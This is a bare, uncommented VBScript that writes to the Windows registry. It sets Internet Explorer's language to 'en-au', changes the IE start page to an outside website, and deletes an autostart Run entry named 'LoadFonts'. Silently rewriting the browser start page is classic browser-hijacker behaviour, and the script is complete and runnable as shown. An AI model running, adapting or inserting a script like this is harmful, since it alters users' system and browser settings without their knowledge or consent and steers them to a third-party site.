Set W = Wscript.CreateObject("Wscript.Shell")
W.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\International\AcceptLanguage","en-au"
W.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.hardcorevibe.com"
W.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\LoadFonts"
